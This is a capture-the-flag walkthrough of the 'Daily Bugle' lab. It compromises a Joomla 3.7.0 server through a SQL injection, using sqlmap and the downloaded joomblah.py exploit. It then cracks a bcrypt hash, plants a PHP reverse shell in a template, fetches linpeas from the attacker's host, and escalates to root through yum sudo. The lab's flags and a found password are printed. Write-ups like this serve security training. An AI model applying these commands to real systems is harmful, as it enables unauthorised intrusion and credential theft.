# Daily Bugle

> Compromise a Joomla CMS account via SQLi, practise cracking hashes and escalate your privileges by taking advantage of yum.

<br>

### Process:

1. Deploy:
	- access the web server:
		- scan IP: `sudo nmap -T4 10.10.225.223`
		- found SSH, HTTP, MySQL
		- go to website: `http://10.10.225.223`
		- who robbed the bank = **spiderman**
2. Obtain user and root:
	- run gobuster against web app: 
		- `gobuster dir -u http://10.10.225.223 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt`
		- found "/adminstrator" page that is a Joomla login
	- find the version of Joomla running: 
		- goto: `http://10.10.225.223/administrator/manifests/files/joomla.xml`
		- Joomla version running = **3.7.0**
	- search for vulnerability in this Joomla version:
		- `searcshploit joomla 3.7.0`
		- found SQLi vulnerabilit: `searchsploit -x php/webapps/42033.txt`
	- run the SQLMap injection found:
		- `sqlmap -u "http://10.10.225.223/administrator/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent -p list[fullordering] --dbs`
		- failed to execute 
	- try the python alternative tool that exploits this vulnerability:
		- download: `wget https://raw.githubusercontent.com/XiphosResearch/exploits/master/Joomblah/joomblah.py`
		- run: `python joombla.py http://10.10.225.223`
		- has found for jonah user = *\$2y\$10\$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm*
	- crack hash found with john:
		- `echo '$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm' > hash.txt`
		- `john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=bcrypt`
		- jonah's cracked password = **
	- login to Joomla portal using jonah account with cracked password 
	- create a reverse PHP shell using a Joomla template:
		- under Configuration select Templates -> Templates tab -> click on template and change out index.php for a PHP reverse shell -> save -> go back to Styles tab and set the altered template to the default for all pages
	- go to main web page to execute reverse PHP shell
	- esclate privileges to user:
		- upload linpeas to machine: `cd /var/www/html && wget http://10.11.31.198:8080/linpeas.sh`
		- found password in "configuration.php" file in "/var/www/html" directory = *nv5uz9r3ZEDzVjNu*
		- try to use password to access "jjameson" account -- worked 
		- user flag = **27a260fe3cba712cfdedb1c86d80442e**
	- escalate privileges to root:
		- check sudo privileges: `sudo -l` -- found "yum" binary
		- found Sudo privilege esclation exploit on [GTFO Bins](https://gtfobins.github.io/gtfobins/yum/#sudo)
		- root flag = **eec3d53292b1821868266858d7fa6f79**
			
